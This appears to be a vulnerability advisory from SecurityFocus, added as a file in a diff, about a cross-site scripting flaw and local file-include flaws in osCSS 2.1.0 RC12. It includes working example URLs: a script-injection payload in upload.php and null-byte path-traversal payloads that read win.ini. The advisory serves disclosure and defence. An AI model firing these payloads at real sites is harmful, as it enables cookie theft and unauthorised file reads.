@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/47074/info
+
+osCSS is prone to a cross-site scripting vulnerability and multiple local file-include vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, and open or run arbitrary files in the context of the webserver process.
+
+osCSS 2.1.0 RC12 is vulnerable; other versions may also be affected. 
+
+
+Cross-site scripting:
+
+http://www.example.com/oscss2/admin108/editeur/tiny_mce/plugins/tinybrowser/upload.php?feid=%22);alert(0);//
+
+
+Local file include:
+
+http://www.example.com/oscss2/admin108/index.php?page_admin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+
+http://www.example.com/oscss2/admin108/popup_image.php?page_admin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 
